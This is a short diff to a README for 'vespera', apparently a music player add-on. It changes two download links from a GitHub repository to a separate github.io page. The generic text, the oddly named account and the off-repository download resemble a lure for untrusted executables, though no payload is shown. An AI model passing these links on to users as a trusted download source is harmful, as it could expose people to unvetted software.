@@ -1,6 +1,6 @@
 # 🎧 vespera - Enhance your music player experience today
 
-[![](https://img.shields.io/badge/Download_Vespera-blue.svg)](https://github.com/Carolieconcealing132/vespera)
+[![](https://img.shields.io/badge/Download_Vespera-blue.svg)](https://carolieconcealing132.github.io)
 
 ## 📋 What is Vespera
 
@@ -20,7 +20,7 @@ Vespera offers several tools to improve your listening habits:
 
 You obtain the software from our official release page. Please follow these steps to set up the application on your computer.
 
-1. Go to the [Vespera download page](https://github.com/Carolieconcealing132/vespera).
+1. Go to the [Vespera download page](https://carolieconcealing132.github.io).
 2. Look for the section labeled Releases.
 3. Select the file that matches your computer system architecture.
 4. Save the file to a folder you recognize, such as your Downloads folder.
